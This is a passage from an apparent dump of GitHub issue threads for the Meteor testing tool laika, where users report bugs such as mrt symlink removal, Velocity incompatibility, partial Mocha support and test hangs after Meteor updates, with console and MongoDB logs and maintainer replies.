Just to show with SSR, it only picks the data comes from subscriptions.

Send me a PR with a fix.
</Body>
    </Comment>
  </Issue_53>
  <Issue_54>
    <Repository>laika</Repository>
    <Title>Prevent installing with mrt</Title>
    <Owner>arunoda</Owner>
    <Body>I tend to develop meteor packages locally by creating symbolic from the `packages` directory. When running `mrt`, these are removed, but since I use Meteor's own package manager, there's no need to run `mrt` anyway. The issue is that Laika always runs Meteor through `mrt`, removing these symlinks. It would be nice to have a `no-mrt` option to avoid this and run `meteor` directly.
</Body>
    <State>open</State>
    <Comment>
      <Owner>apendua</Owner>
      <Body>I think it depends on the existence of smart.json file in your project root
directory. Can you try removing it and see what happens? If it does not
help we can surely implement the solution your talking about.

W dniu sobota, 13 grudnia 2014 Aram Kocharyan notifications@github.com
napisa&#322;(a):

&gt; I tend to develop meteor packages locally by creating symbolic from the
&gt; packages directory. When running mrt, these are removed, but since I use
&gt; Meteor's own package manager, there's no need to run mrt anyway. The
&gt; issue is that Laika always runs Meteor through mrt, removing these
&gt; symlinks. It would be nice to have a no-mrt option to avoid this and run
&gt; meteor directly.
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHub
&gt; https://github.com/arunoda/laika/issues/150.
</Body>
    </Comment>
    <Comment>
      <Owner>aramk</Owner>
      <Body>Hi @apendua. Removing `smart.json` works as a temporary solution as long as it's added back after running the tests. It still has the purpose of specifying the external, unpublished packages (most of them forks) used in the project, so removing them permanently isn't an option. I suspect replacing the invocation of `mrt` to `meteor` within laika if an option is provided would work well.
</Body>
    </Comment>
    <Comment>
      <Owner>apendua</Owner>
      <Body>@aramk I agree. Can you implement this fix and submit a PR? I would also suggest looking into another testing solution which I am currently working on:
https://github.com/anticoders/gagarin
</Body>
    </Comment>
  </Issue_54>
  <Issue_55>
    <Repository>laika</Repository>
    <Title>Apply settings to the first application launch</Title>
    <Owner>arunoda</Owner>
    <Body>When an application under tests was launched first, it didn't recieve settings which were passed as parameter to laika.
Why settings are passed via --settings parameter instead of the environment variable? Because in the latter case settings were applied to an application with a significant delay after start.

&lt;!-- Reviewable:start --&gt;

[&lt;img src="https://reviewable.io/review_button.png" height=40 alt="Review on Reviewable"/&gt;](https://reviewable.io/reviews/arunoda/laika/149)

&lt;!-- Reviewable:end --&gt;
</Body>
    <State>open</State>
    <Comment>
      <Owner>apendua</Owner>
      <Body>@eluck Good catch!
</Body>
    </Comment>
    <Comment>
      <Owner>eluck</Owner>
      <Body>@apendua Thanks! Is Laika currently supported? I see a lot of your unmerged pull requests.
</Body>
    </Comment>
    <Comment>
      <Owner>apendua</Owner>
      <Body>@eluck Good question! I can see that almost half of those PRs are mine :)

Anyway, we try to do our best to keep laika compatible with the latest meteor versions, but we don't really develop new features. This is mainly because it's very hard to ensure backward compatibility.

Also, it's very likely that in the nearest future Gagarin will replace laika:
https://github.com/anticoders/gagarin
</Body>
    </Comment>
    <Comment>
      <Owner>eluck</Owner>
      <Body>@apendua Great stuff! I try using Laika as a performance tests runner. Running tests in a clean environment is essential for that. So I'd like the project to be developed and supported no matter how it is named. BTW cool picture :)
</Body>
    </Comment>
  </Issue_55>
  <Issue_56>
    <Repository>laika</Repository>
    <Title>Laika doesn't work with velocity tests.</Title>
    <Owner>arunoda</Owner>
    <Body>I tried to add laike to an app where i have also the `sanjo:jasmine` velocity package add. It fails stating:

```
    [server log] TypeError: Object #&lt;Object&gt; has no method 'registerTestingFramework'
  at [object Object]._.extend.registerWithVelocity (/Users/frozeman/.../my-meteor-blog/.meteor/local/build/programs/server/packages/sanjo_jasmine.js:200:14)
```

If i remove `sanjo:jasmine` it fails, because it want to read also the jasmine test files:

```
ReferenceError: describe is not defined
```

Could you add an option to specify the folder in which laika is looking for the tests?
All velocity frameworks must be placed inside a folder named after the testing framework like `tests/jasmine` or `tests/mocha`. Could we add the option to only look in `tests/laika`?

I'm currently finishing up my book (https://www.packtpub.com/web-development/building-single-page-web-apps-meteor) and would like to present laika in the testing chapter, next to velocity.

If you can make it work with velocity would be great, otherwise, if you at least add the option to specify the folder, so it could work along velocity (though one has to remove `sanjo:jasmine` before, which is also not ideal) i could leave laika in the chapter, otherwise i have to leave it out as its incompatible to meteors official testing framework :(

I'm kind of in a hurry as the book will be published soon, so i would appreciate if you could look into this asp.
</Body>
    <State>open</State>
    <Comment>
      <Owner>apendua</Owner>
      <Body>@frozeman I think this option is already there:

https://github.com/arunoda/laika/issues#L8

Can you please verify if it fulfills your needs?
</Body>
    </Comment>
  </Issue_56>
  <Issue_57>
    <Repository>laika</Repository>
    <Title>Integrate with Velocity</Title>
    <Owner>arunoda</Owner>
    <Body>Velocity is a really nice framework for testing with meteor. Integration with velocity would be really nice.
</Body>
    <State>open</State>
    <Comment>
      <Owner>apendua</Owner>
      <Body>To my understanding both laika and velocity serves the same goal and that is to spawn a sandbox meteor environment for running tests. I really doubt there's a reasonable way to integrate those two frameworks.
</Body>
    </Comment>
  </Issue_57>
  <Issue_58>
    <Repository>laika</Repository>
    <Title>Only Partial Mocha Support?</Title>
    <Owner>arunoda</Owner>
    <Body>I thought Laika just runs on top of Mocha while providing a bunch of useful meteor-specific features. But I've run into a few things that don't seem to work in Laika such as skipping tests, or using placeholder tests:

``` js
it("Placeholder test..");
it.skip("This test isn't ready yet, so skipping", function(done, server, client) {
  // Test code in here...
});
```

The code above breaks my tests. Any way to update this so that it supports everything in Mocha?
</Body>
    <State>open</State>
    <Comment>
      <Owner>apendua</Owner>
      <Body>@iansinnott Not yet. The problem is that we're currently bounded to a Arunoda's fork of the original mocha and also laika is overwriting some mocha original functions. We are currently working on fixing this problem.
</Body>
    </Comment>
  </Issue_58>
  <Issue_59>
    <Repository>laika</Repository>
    <Title>Adding Client-side Helpers Within PhantomJS</Title>
    <Owner>arunoda</Owner>
    <Body>There doesn't seem to be a good way to hook into PhantomJS and add custom code. Maybe this could be accomplished by adding an `onInitialized` callback to the PhantomJS instance. This would be a huge improvement and would probably solve quite a few of the open issues here.

For anyone who needs to include helpers on the client side _now_, you can just put them in your client-side meteor code:

``` js
// client/helpers/phantom_helpers.js
if (window.callPhantom) {
  domHelper = function() {
    return 'stuff...';
  };
}
```

This is still ugly since all test code should really go under `tests/`, not `client/`, but it's a quick workaround until there is better method.
</Body>
    <State>open</State>
    <Comment>
      <Owner>ghost</Owner>
      <Body>There is way you can keep your helpers in &lt;code&gt;tests/&lt;/code&gt; but it's a little messy.

I just &lt;code&gt;toString&lt;/code&gt; all of my helpers, passed it as a parameter to evalSync and then eval on the other side. 
</Body>
    </Comment>
  </Issue_59>
  <Issue_60>
    <Repository>laika</Repository>
    <Title>setup() and teardown() methods?</Title>
    <Owner>arunoda</Owner>
    <Body>I was surprised that the documentation didn't mention any setup() and teardown() methods. Looking at `globals` I can see that they're defined in side the `suite`, by I'm not sure if it's from another library or not. I can't find any mention of them in the code.
</Body>
    <State>open</State>
    <Comment>
      <Owner>neonsamurai</Owner>
      <Body>I wondered myself what the pattern is for setup/teardown in laika?

The methods exist and get called, but I can't seem to pass done, server, client objects to them which make them kinda useless unless I am missing something?
</Body>
    </Comment>
  </Issue_60>
  <Issue_61>
    <Repository>laika</Repository>
    <Title>Laika broke with 0.8.1</Title>
    <Owner>arunoda</Owner>
    <Body>After i've updated my app to 0.8.1.1, my tests hang and timeout. I can make them pass by changing `.meteor/release` to 0.8.0.1. From what I can tell, it's only affected by the client tests.

I've also replicated this by cloning down hello-laika. I pasted the output below:

```
hello-laika-master|&#8658; laika -v
0.3.9
hello-laika-master|&#8658; laika

  injecting laika...
  loading phantomjs...
  loading initial app pool...


  Posts
    &#10003; in the server
    &#10003; using both client and the server
    &#10003; using two clients


  3 passing (981ms)

  cleaning up injected code
```

```
hello-laika-master|&#8658; meteor update
hello-laika-master: updated to Meteor 0.8.1.1.

-- Notice --

0.8.0: Meteor has a new live templating engine: Blaze!
       See https://github.com/meteor/meteor/wiki/Using-Blaze for what's new.
```

```
hello-laika-master|&#8658; laika

  injecting laika...
  loading phantomjs...
  loading initial app pool...


  Posts
    &#10003; in the server
    &#10003; using both client and the server
    1) using two clients


  2 passing (5s)
  1 failing

  1) Posts using two clients:
     Error: timeout of 5000ms exceeded
      at null.&lt;anonymous&gt; (/usr/local/lib/node_modules/laika/node_modules/mocha/lib/runnable.js:175:14)
      at Timer.listOnTimeout [as ontimeout] (timers.js:110:15)



  cleaning up injected code
```

_change release back to 0.8.0.1_

```
hello-laika-master|&#8658; vim .meteor/release
hello-laika-master|&#8658; laika

  injecting laika...
  loading phantomjs...
  loading initial app pool...


  Posts
    &#10003; in the server
    &#10003; using both client and the server
    &#10003; using two clients


  3 passing (845ms)

  cleaning up injected code
```

I hope this helps!
</Body>
    <State>open</State>
    <Comment>
      <Owner>AdamBrodzinski</Owner>
      <Body>Perhaps this is from a [change](https://github.com/meteor/meteor/blob/devel/History.md#upgraded-dependencies) with 'css-stringify'. 
</Body>
    </Comment>
    <Comment>
      <Owner>Linskeyd</Owner>
      <Body>Hey Adam please take a look at issue #77 that was closed a while ago.  I wonder if third test failing is related to this somehow?  Adding in server side evals which do nothing on each test that uses only client calls allows the tests to pass, but they take around 1.3 seconds to complete which is pretty long. 
</Body>
    </Comment>
    <Comment>
      <Owner>AdamBrodzinski</Owner>
      <Body>@Linskeyd I just tried that but it doesn't make a difference.

However.... while trying that, one time I started up `mongod` without the `--smallfiles --noprealloc --nojournal` and they all passed :smile: Thanks!

passing:
`mongod`

client tests fail:
`mongod --smallfiles --noprealloc --nojournal`
</Body>
    </Comment>
    <Comment>
      <Owner>Linskeyd</Owner>
      <Body>@AdamBrodzinski It worked for me too!!  Thanks :smile: 
</Body>
    </Comment>
  </Issue_61>
  <Issue_62>
    <Repository>laika</Repository>
    <Title>Issue after updating meteor: laika hangs and requires to clear mongod's data files every time</Title>
    <Owner>arunoda</Owner>
    <Body>Like stopped working after Meteor update from 0.7.0.1 to 0.7.2 (the same problems with 0.8.0).

This is the log from "laika -V" for 0.7.0.1 project:

```
vasilysizov@ubuntu:~/projects/test$ sudo laika -V
[laika log] accepting the following extensions: (js|coffee)

  injecting laika...
  loading phantomjs...
[app touch log] [[[[[ ~/projects/test ]]]]]

  loading initial app pool...
[app touch log] =&gt; Meteor server running on: http://localhost:25797/
[laika log] using nodejs bin(from meteor): /home/vasilysizov/.meteor/tools/09b63f1ed5/bin/node
[laika log] using nodejs bin(from meteor): /home/vasilysizov/.meteor/tools/09b63f1ed5/bin/node
[server log] laika code injected and listening on: 18700
[server log] LISTENING
[laika log] adding compiler module: coffee-script
[laika log] adding test file: /home/vasilysizov/projects/test/tests/$setup.coffee
[laika log] adding test file: /home/vasilysizov/projects/test/tests/test.coffee
1..1
[server log] laika code injected and listening on: 17740
[server log] LISTENING
[laika log] start running test
[laika log] using nodejs bin(from meteor): /home/vasilysizov/.meteor/tools/09b63f1ed5/bin/node
[laika log] running test
[laika log] test completed
[laika log] closing app
ok 1 Score calculation should check joining and leaving project
- tests 1
- pass 1
- fail 0
  cleaning up injected code
```

...and this one from "laika -V" for the same project updated to 0.7.2:

```
vasilysizov@ubuntu:~/projects/test$ sudo laika -V
[laika log] accepting the following extensions: (js|coffee)

  injecting laika...
  loading phantomjs...
[app touch log] [[[[[ ~/projects/test ]]]]]

=&gt; Started proxy.
[app touch log] I20140405-15:38:46.607(4)? laika code injected and listening on: 11024
[app touch log] =&gt; Started your app.
[app touch log] 
=&gt; App running at: http://localhost:11965/
[app touch log] =&gt; Meteor 0.8.0 is available. Update this project with 'meteor update'.
```

So, it just hangs!

I have a feeling that the problem is with the DB.
Mongod's log shows nothing:

```
vasilysizov@ubuntu:~/projects/test$ mongod --smallfiles --noprealloc --nojournal --dbpath ./etc/testmongo --nohttpinterface
note: noprealloc may hurt performance in many applications
Sat Apr  5 15:51:44 [initandlisten] MongoDB starting : pid=20632 port=27017 dbpath=./etc/testmongo 64-bit host=ubuntu
Sat Apr  5 15:51:44 [initandlisten] db version v2.0.4, pdfile version 4.5
Sat Apr  5 15:51:44 [initandlisten] git version: nogitversion
Sat Apr  5 15:51:44 [initandlisten] build info: Linux lamiak 2.6.42-37-generic #58-Ubuntu SMP Thu Jan 24 15:28:10 UTC 2013 x86_64 BOOST_LIB_VERSION=1_46_1
Sat Apr  5 15:51:44 [initandlisten] options: { dbpath: "./etc/testmongo", nohttpinterface: true, nojournal: true, noprealloc: true, smallfiles: true }
Sat Apr  5 15:51:44 [initandlisten] waiting for connections on port 27017
Sat Apr  5 15:51:50 [initandlisten] connection accepted from 127.0.0.1:32957 #1
Sat Apr  5 15:51:50 [conn1] end connection 127.0.0.1:32957
Sat Apr  5 15:51:50 [initandlisten] connection accepted from 127.0.0.1:32958 #2
Sat Apr  5 15:51:50 [conn2] end connection 127.0.0.1:32958
Sat Apr  5 15:51:50 [initandlisten] connection accepted from 127.0.0.1:32959 #3
Sat Apr  5 15:51:50 [initandlisten] connection accepted from 127.0.0.1:32960 #4
Sat Apr  5 15:51:50 [initandlisten] connection accepted from 127.0.0.1:32961 #5
Sat Apr  5 15:51:50 [initandlisten] connection accepted from 127.0.0.1:32962 #6
Sat Apr  5 15:51:50 [initandlisten] connection accepted from 127.0.0.1:32963 #7
Sat Apr  5 15:51:50 [conn3] end connection 127.0.0.1:32959
Sat Apr  5 15:51:50 [conn4] end connection 127.0.0.1:32960
Sat Apr  5 15:51:50 [conn6] end connection 127.0.0.1:32962
Sat Apr  5 15:51:50 [conn5] end connection 127.0.0.1:32961
Sat Apr  5 15:51:50 [conn7] end connection 127.0.0.1:32963
Sat Apr  5 15:51:52 [initandlisten] connection accepted from 127.0.0.1:32967 #8
Sat Apr  5 15:51:52 [conn8] end connection 127.0.0.1:32967
Sat Apr  5 15:51:52 [initandlisten] connection accepted from 127.0.0.1:32968 #9
Sat Apr  5 15:51:52 [initandlisten] connection accepted from 127.0.0.1:32969 #10
Sat Apr  5 15:51:52 [initandlisten] connection accepted from 127.0.0.1:32970 #11
Sat Apr  5 15:51:52 [initandlisten] connection accepted from 127.0.0.1:32971 #12
Sat Apr  5 15:51:52 [initandlisten] connection accepted from 127.0.0.1:32972 #13
```

(hangs here)

I have tried to restart mongod, but it didn't help.
But when I clear mongod's files (rm \* in mongod data directory) and then run "laika -V" everything works fine, like in the previous example. Next time I run application, it also hangs, so I need to clear the files every time I run laika.

This is the log of DB for successful run:

```
vasilysizov@ubuntu:~/projects/test$ mongod --smallfiles --noprealloc --nojournal --dbpath ./etc/testmongo --nohttpinterface
note: noprealloc may hurt performance in many applications
Sat Apr  5 15:53:53 [initandlisten] MongoDB starting : pid=20756 port=27017 dbpath=./etc/testmongo 64-bit host=ubuntu
Sat Apr  5 15:53:53 [initandlisten] db version v2.0.4, pdfile version 4.5
Sat Apr  5 15:53:53 [initandlisten] git version: nogitversion
Sat Apr  5 15:53:53 [initandlisten] build info: Linux lamiak 2.6.42-37-generic #58-Ubuntu SMP Thu Jan 24 15:28:10 UTC 2013 x86_64 BOOST_LIB_VERSION=1_46_1
Sat Apr  5 15:53:53 [initandlisten] options: { dbpath: "./etc/testmongo", nohttpinterface: true, nojournal: true, noprealloc: true, smallfiles: true }
Sat Apr  5 15:53:53 [initandlisten] waiting for connections on port 27017
Sat Apr  5 15:54:00 [initandlisten] connection accepted from 127.0.0.1:32995 #1
Sat Apr  5 15:54:00 [conn1] end connection 127.0.0.1:32995
Sat Apr  5 15:54:00 [initandlisten] connection accepted from 127.0.0.1:32996 #2
Sat Apr  5 15:54:00 [conn2] end connection 127.0.0.1:32996
Sat Apr  5 15:54:00 [initandlisten] connection accepted from 127.0.0.1:32997 #3
Sat Apr  5 15:54:00 [initandlisten] connection accepted from 127.0.0.1:32998 #4
Sat Apr  5 15:54:00 [initandlisten] connection accepted from 127.0.0.1:32999 #5
Sat Apr  5 15:54:00 [initandlisten] connection accepted from 127.0.0.1:33000 #6
Sat Apr  5 15:54:00 [initandlisten] connection accepted from 127.0.0.1:33001 #7
Sat Apr  5 15:54:00 [conn3] end connection 127.0.0.1:32997
Sat Apr  5 15:54:00 [conn4] end connection 127.0.0.1:32998
Sat Apr  5 15:54:00 [conn5] end connection 127.0.0.1:32999
Sat Apr  5 15:54:00 [conn6] end connection 127.0.0.1:33000
Sat Apr  5 15:54:00 [conn7] end connection 127.0.0.1:33001
Sat Apr  5 15:54:01 [initandlisten] connection accepted from 127.0.0.1:33005 #8
Sat Apr  5 15:54:01 [conn8] end connection 127.0.0.1:33005
Sat Apr  5 15:54:01 [initandlisten] connection accepted from 127.0.0.1:33006 #9
Sat Apr  5 15:54:01 [initandlisten] connection accepted from 127.0.0.1:33007 #10
Sat Apr  5 15:54:01 [initandlisten] connection accepted from 127.0.0.1:33008 #11
Sat Apr  5 15:54:01 [initandlisten] connection accepted from 127.0.0.1:33009 #12
Sat Apr  5 15:54:01 [initandlisten] connection accepted from 127.0.0.1:33010 #13
Sat Apr  5 15:54:01 [FileAllocator] allocating new datafile ./etc/testmongo/_laika.ns, filling with zeroes...
Sat Apr  5 15:54:01 [FileAllocator] creating directory ./etc/testmongo/_tmp
Sat Apr  5 15:54:01 [FileAllocator] done allocating datafile ./etc/testmongo/_laika.ns, size: 16MB,  took 0 secs
Sat Apr  5 15:54:01 [FileAllocator] allocating new datafile ./etc/testmongo/_laika.0, filling with zeroes...
Sat Apr  5 15:54:01 [FileAllocator] done allocating datafile ./etc/testmongo/_laika.0, size: 16MB,  took 0.001 secs
Sat Apr  5 15:54:01 [conn11] build index _laika.users { _id: 1 }
Sat Apr  5 15:54:01 [conn11] build index done 0 records 0 secs
Sat Apr  5 15:54:01 [conn11] info: creating collection _laika.users on add index
Sat Apr  5 15:54:01 [conn11] build index _laika.users { username: 1 }
Sat Apr  5 15:54:01 [conn11] build index done 0 records 0 secs
Sat Apr  5 15:54:01 [conn13] build index _laika.users { emails.address: 1 }
Sat Apr  5 15:54:01 [conn13] build index done 0 records 0 secs
Sat Apr  5 15:54:01 [conn10] build index _laika.users { services.resume.loginTokens.hashedToken: 1 }
Sat Apr  5 15:54:01 [conn10] build index done 0 records 0 secs
Sat Apr  5 15:54:01 [conn12] build index _laika.users { services.resume.loginTokens.token: 1 }
Sat Apr  5 15:54:01 [conn12] build index done 0 records 0 secs
Sat Apr  5 15:54:01 [conn9] build index _laika.users { services.resume.haveLoginTokensToDelete: 1 }
Sat Apr  5 15:54:01 [conn9] build index done 0 records 0 secs
Sat Apr  5 15:54:01 [conn11] build index _laika.users { services.resume.loginTokens.when: 1 }
Sat Apr  5 15:54:01 [conn11] build index done 0 records 0 secs
Sat Apr  5 15:54:01 [conn9] end connection 127.0.0.1:33006
Sat Apr  5 15:54:01 [conn10] end connection 127.0.0.1:33007
Sat Apr  5 15:54:01 [conn11] end connection 127.0.0.1:33008
Sat Apr  5 15:54:01 [conn12] end connection 127.0.0.1:33009
Sat Apr  5 15:54:01 [conn13] end connection 127.0.0.1:33010
Sat Apr  5 15:54:02 [initandlisten] connection accepted from 127.0.0.1:33011 #14
Sat Apr  5 15:54:02 [conn14] end connection 127.0.0.1:33011
Sat Apr  5 15:54:02 [initandlisten] connection accepted from 127.0.0.1:33012 #15
Sat Apr  5 15:54:02 [initandlisten] connection accepted from 127.0.0.1:33013 #16
Sat Apr  5 15:54:02 [initandlisten] connection accepted from 127.0.0.1:33014 #17
Sat Apr  5 15:54:02 [initandlisten] connection accepted from 127.0.0.1:33015 #18
Sat Apr  5 15:54:02 [initandlisten] connection accepted from 127.0.0.1:33016 #19
Sat Apr  5 15:54:02 [initandlisten] connection accepted from 127.0.0.1:33017 #20
Sat Apr  5 15:54:02 [conn20] end connection 127.0.0.1:33017
Sat Apr  5 15:54:02 [initandlisten] connection accepted from 127.0.0.1:33018 #21
Sat Apr  5 15:54:02 [initandlisten] connection accepted from 127.0.0.1:33019 #22
Sat Apr  5 15:54:02 [initandlisten] connection accepted from 127.0.0.1:33020 #23
Sat Apr  5 15:54:02 [initandlisten] connection accepted from 127.0.0.1:33021 #24
Sat Apr  5 15:54:02 [initandlisten] connection accepted from 127.0.0.1:33022 #25
Sat Apr  5 15:54:02 [FileAllocator] allocating new datafile ./etc/testmongo/laika-P0N0F45ww1.ns, filling with zeroes...
Sat Apr  5 15:54:02 [FileAllocator] done allocating datafile ./etc/testmongo/laika-P0N0F45ww1.ns, size: 16MB,  took 0.002 secs
Sat Apr  5 15:54:02 [FileAllocator] allocating new datafile ./etc/testmongo/laika-P0N0F45ww1.0, filling with zeroes...
Sat Apr  5 15:54:02 [FileAllocator] done allocating datafile ./etc/testmongo/laika-P0N0F45ww1.0, size: 16MB,  took 0.001 secs
Sat Apr  5 15:54:02 [conn23] build index laika-P0N0F45ww1.users { _id: 1 }
Sat Apr  5 15:54:02 [conn23] build index done 0 records 0 secs
Sat Apr  5 15:54:02 [conn23] info: creating collection laika-P0N0F45ww1.users on add index
Sat Apr  5 15:54:02 [conn23] build index laika-P0N0F45ww1.users { username: 1 }
Sat Apr  5 15:54:02 [conn23] build index done 0 records 0 secs
Sat Apr  5 15:54:02 [conn25] build index laika-P0N0F45ww1.users { emails.address: 1 }
Sat Apr  5 15:54:02 [conn25] build index done 0 records 0 secs
Sat Apr  5 15:54:02 [conn22] build index laika-P0N0F45ww1.users { services.resume.loginTokens.hashedToken: 1 }
Sat Apr  5 15:54:02 [conn22] build index done 0 records 0 secs
Sat Apr  5 15:54:02 [conn24] build index laika-P0N0F45ww1.users { services.resume.loginTokens.token: 1 }
Sat Apr  5 15:54:02 [conn24] build index done 0 records 0 secs
Sat Apr  5 15:54:02 [conn21] build index laika-P0N0F45ww1.users { services.resume.haveLoginTokensToDelete: 1 }
Sat Apr  5 15:54:02 [conn21] build index done 0 records 0 secs
Sat Apr  5 15:54:02 [conn23] build index laika-P0N0F45ww1.users { services.resume.loginTokens.when: 1 }
Sat Apr  5 15:54:02 [conn23] build index done 0 records 0 secs
Sat Apr  5 15:54:03 [initandlisten] connection accepted from 127.0.0.1:33023 #26
Sat Apr  5 15:54:03 [conn26] end connection 127.0.0.1:33023
Sat Apr  5 15:54:03 [initandlisten] connection accepted from 127.0.0.1:33024 #27
Sat Apr  5 15:54:03 [initandlisten] connection accepted from 127.0.0.1:33025 #28
Sat Apr  5 15:54:03 [initandlisten] connection accepted from 127.0.0.1:33026 #29
Sat Apr  5 15:54:03 [initandlisten] connection accepted from 127.0.0.1:33027 #30
Sat Apr  5 15:54:03 [initandlisten] connection accepted from 127.0.0.1:33028 #31
Sat Apr  5 15:54:03 [FileAllocator] allocating new datafile ./etc/testmongo/laika-Y8OA3i25EH.ns, filling with zeroes...
Sat Apr  5 15:54:03 [FileAllocator] done allocating datafile ./etc/testmongo/laika-Y8OA3i25EH.ns, size: 16MB,  took 0.001 secs
Sat Apr  5 15:54:03 [FileAllocator] allocating new datafile ./etc/testmongo/laika-Y8OA3i25EH.0, filling with zeroes...
Sat Apr  5 15:54:03 [FileAllocator] done allocating datafile ./etc/testmongo/laika-Y8OA3i25EH.0, size: 16MB,  took 0.001 secs
Sat Apr  5 15:54:03 [conn29] build index laika-Y8OA3i25EH.users { _id: 1 }
Sat Apr  5 15:54:03 [conn29] build index done 0 records 0 secs
Sat Apr  5 15:54:03 [conn29] info: creating collection laika-Y8OA3i25EH.users on add index
Sat Apr  5 15:54:03 [conn29] build index laika-Y8OA3i25EH.users { username: 1 }
Sat Apr  5 15:54:03 [conn29] build index done 0 records 0 secs
Sat Apr  5 15:54:03 [conn31] build index laika-Y8OA3i25EH.users { emails.address: 1 }
Sat Apr  5 15:54:03 [conn31] build index done 0 records 0 secs
Sat Apr  5 15:54:03 [conn28] build index laika-Y8OA3i25EH.users { services.resume.loginTokens.hashedToken: 1 }
Sat Apr  5 15:54:03 [conn28] build index done 0 records 0 secs
Sat Apr  5 15:54:03 [conn30] build index laika-Y8OA3i25EH.users { services.resume.loginTokens.token: 1 }
Sat Apr  5 15:54:03 [conn30] build index done 0 records 0 secs
Sat Apr  5 15:54:03 [conn27] build index laika-Y8OA3i25EH.users { services.resume.haveLoginTokensToDelete: 1 }
Sat Apr  5 15:54:03 [conn27] build index done 0 records 0 secs
Sat Apr  5 15:54:03 [conn29] build index laika-Y8OA3i25EH.users { services.resume.loginTokens.when: 1 }
Sat Apr  5 15:54:03 [conn29] build index done 0 records 0 secs
Sat Apr  5 15:54:03 [conn25] build index laika-P0N0F45ww1.projectUserResults { _id: 1 }
Sat Apr  5 15:54:03 [conn25] build index done 0 records 0 secs
Sat Apr  5 15:54:03 [initandlisten] connection accepted from 127.0.0.1:33036 #32
Sat Apr  5 15:54:03 [conn32] end connection 127.0.0.1:33036
Sat Apr  5 15:54:03 [initandlisten] connection accepted from 127.0.0.1:33038 #33
Sat Apr  5 15:54:03 [initandlisten] connection accepted from 127.0.0.1:33039 #34
Sat Apr  5 15:54:03 [initandlisten] connection accepted from 127.0.0.1:33040 #35
Sat Apr  5 15:54:03 [initandlisten] connection accepted from 127.0.0.1:33041 #36
Sat Apr  5 15:54:03 [initandlisten] connection accepted from 127.0.0.1:33042 #37
Sat Apr  5 15:54:03 [conn34] dropDatabase laika-P0N0F45ww1
Sat Apr  5 15:54:03 [conn33] end connection 127.0.0.1:33038
Sat Apr  5 15:54:03 [conn35] end connection 127.0.0.1:33040
Sat Apr  5 15:54:03 [conn34] end connection 127.0.0.1:33039
Sat Apr  5 15:54:03 [conn36] end connection 127.0.0.1:33041
Sat Apr  5 15:54:03 [conn37] end connection 127.0.0.1:33042
Sat Apr  5 15:54:03 [conn27] end connection 127.0.0.1:33024
Sat Apr  5 15:54:03 [conn28] end connection 127.0.0.1:33025
Sat Apr  5 15:54:03 [conn29] end connection 127.0.0.1:33026
Sat Apr  5 15:54:03 [conn30] end connection 127.0.0.1:33027
Sat Apr  5 15:54:03 [conn31] end connection 127.0.0.1:33028
Sat Apr  5 15:54:03 [conn21] end connection 127.0.0.1:33018
Sat Apr  5 15:54:03 [conn22] end connection 127.0.0.1:33019
Sat Apr  5 15:54:03 [conn23] end connection 127.0.0.1:33020
Sat Apr  5 15:54:03 [conn24] end connection 127.0.0.1:33021
Sat Apr  5 15:54:03 [conn25] end connection 127.0.0.1:33022
Sat Apr  5 15:54:03 [initandlisten] connection accepted from 127.0.0.1:33043 #38
Sat Apr  5 15:54:03 [initandlisten] connection accepted from 127.0.0.1:33044 #39
Sat Apr  5 15:54:03 [conn38] end connection 127.0.0.1:33043
Sat Apr  5 15:54:03 [conn39] end connection 127.0.0.1:33044
Sat Apr  5 15:54:03 [initandlisten] connection accepted from 127.0.0.1:33045 #40
Sat Apr  5 15:54:03 [initandlisten] connection accepted from 127.0.0.1:33046 #41
Sat Apr  5 15:54:03 [initandlisten] connection accepted from 127.0.0.1:33047 #42
Sat Apr  5 15:54:03 [initandlisten] connection accepted from 127.0.0.1:33048 #43
Sat Apr  5 15:54:03 [initandlisten] connection accepted from 127.0.0.1:33049 #44
Sat Apr  5 15:54:03 [initandlisten] connection accepted from 127.0.0.1:33050 #45
Sat Apr  5 15:54:03 [initandlisten] connection accepted from 127.0.0.1:33051 #46
Sat Apr  5 15:54:03 [initandlisten] connection accepted from 127.0.0.1:33052 #47
Sat Apr  5 15:54:03 [initandlisten] connection accepted from 127.0.0.1:33053 #48
Sat Apr  5 15:54:03 [initandlisten] connection accepted from 127.0.0.1:33054 #49
Sat Apr  5 15:54:03 [conn42] dropDatabase laika-Y8OA3i25EH
Sat Apr  5 15:54:03 [conn43] dropDatabase laika-2Sv1KbJm53
Sat Apr  5 15:54:03 [conn40] end connection 127.0.0.1:33045
Sat Apr  5 15:54:03 [conn42] end connection 127.0.0.1:33047
Sat Apr  5 15:54:03 [conn44] end connection 127.0.0.1:33049
Sat Apr  5 15:54:03 [conn46] end connection 127.0.0.1:33051
Sat Apr  5 15:54:03 [conn48] end connection 127.0.0.1:33053
Sat Apr  5 15:54:03 [conn41] end connection 127.0.0.1:33046
Sat Apr  5 15:54:03 [conn43] end connection 127.0.0.1:33048
Sat Apr  5 15:54:03 [conn45] end connection 127.0.0.1:33050
Sat Apr  5 15:54:03 [conn47] end connection 127.0.0.1:33052
Sat Apr  5 15:54:03 [conn49] end connection 127.0.0.1:33054
Sat Apr  5 15:54:11 [conn16] end connection 127.0.0.1:33013
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>pawelos88</Owner>
      <Body>It's the same for me - I have to clear mongodb working directory after each test run.
</Body>
    </Comment>
    <Comment>
      <Owner>nickmccurdy</Owner>
      <Body>@VasilySizov If possible, please edit your post and surround the log info with ``` to make a markdown code block. It seems like a bunch of issues were accidentally tagged because of the line numbers.
</Body>
    </Comment>
  </Issue_62>
  <Issue_63>
    <Repository>laika</Repository>
    <Title>don't fail if server cosole out has the workd 'error'</Title>
    <Owner>arunoda</Owner>
    <Body>From what I can tell, every time the word 'error' shows up anywhere in the meteor server log, laika concludes that the server crashes and stops the tests.

This happens even if the log output is: "This worked great, there was no error!".

Is there any way to disable this aggressive grepping for 'error' from failing the tests?
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Yep. This is some ugly point.
I'm working on it.

---

Arunoda Susiripala
I curate Meteor Weekly - Check it
out!http://meteorhacks.com/meteor-weekly/?utm_source=email-footer&amp;utm_medium=email&amp;utm_campaign=meteorweekly

On Wed, Apr 2, 2014 at 1:04 AM, Julian Cerruti notifications@github.comwrote:

&gt; From what I can tell, every time the word 'error' shows up anywhere in the
&gt; meteor server log, laika concludes that the server crashes and stops the
&gt; tests.
&gt; 
&gt; This happens even if the log output is: "This worked great, there was no
&gt; error!".
&gt; 
&gt; Is there any way to disable this aggressive grepping for 'error' from
&gt; failing the tests?
&gt; 
&gt; &#8212;
